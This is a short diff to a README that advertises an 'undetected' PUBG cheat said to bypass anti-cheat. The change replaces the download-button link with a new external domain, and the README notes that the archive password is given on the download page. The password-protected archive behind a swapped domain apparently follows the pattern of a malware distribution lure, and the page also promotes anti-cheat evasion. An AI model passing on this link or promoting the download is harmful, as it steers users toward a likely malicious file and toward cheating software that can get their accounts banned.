@@ -18,7 +18,7 @@ PUBG Internal Cheat - undetected PUBG cheat. Bypasses anti-cheat system. Works o
 
 ## Download
 
-[![Download v4.4.0](https://img.shields.io/badge/Download_v4.4.0-ec4899?style=for-the-badge&logoColor=white)](https://connectinstruction.com/pubginternalcheat)
+[![Download v4.4.0](https://img.shields.io/badge/Download_v4.4.0-ec4899?style=for-the-badge&logoColor=white)](https://dllvcrun.com/pubginternalcheat)
 
 > The archive password is shown on the download page.
 
